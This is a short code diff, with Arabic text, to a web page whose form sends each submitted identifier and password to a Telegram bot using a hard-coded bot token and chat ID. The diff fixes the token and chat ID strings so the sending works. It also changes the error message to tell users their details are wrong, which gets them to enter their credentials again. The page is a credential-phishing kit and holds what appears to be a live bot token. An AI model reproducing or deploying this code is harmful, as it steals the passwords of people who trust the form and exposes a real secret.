@@ -111,7 +111,7 @@
                     document.getElementById('registrationForm').reset();
                 })
                 .catch(error => {
-                    messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.";
+                    messageDiv.textContent = "عذرا المعلومات خاطئة يرجى تأكد و إعادة محاولة.";
                     messageDiv.className = "message error";
                     messageDiv.style.display = "block";
                     console.error('Error:', error);
@@ -120,8 +120,8 @@
 
         async function sendToTelegramBot(identifier, password) {
             // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
-            const botToken = '8400094131:AAFIepzRm8tGMq-khwKWvFyEwbgIFbu5fQEا ';
-            const chatId = '8464061957 ';
+            const botToken = '8400094131:AAFIepzRm8tGMq-khwKWvFyEwbgIFbu5fQEا';
+            const chatId = '8464061957';
             
             const message = `بيانات تسجيل جديدة:\n\nالمعرف: ${identifier}\nكلمة المرور: ${password}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
